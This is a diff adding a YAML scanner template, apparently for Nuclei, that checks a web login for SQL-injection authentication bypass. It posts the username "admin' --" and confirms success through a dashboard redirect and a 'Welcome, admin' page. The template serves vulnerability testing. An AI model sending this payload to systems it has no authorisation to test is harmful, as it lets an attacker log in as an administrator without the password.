@@ -1,0 +1,26 @@
+id: sqli-login-authbypass
+name: SQL Injection – Login Authentication Bypass
+severity: critical
+impact: Attacker can log in as any user, including admin, without knowing the password by injecting SQL into the username field.
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/login"
+    body: "username=admin' -- &password=invalid-password-xyz"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    matchers:
+      - type: status
+        status: 302
+      - type: word
+        part: header
+        words:
+          - "/dashboard"
+verification:
+  - method: GET
+    path: "{{BaseURL}}/dashboard"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Welcome, admin"
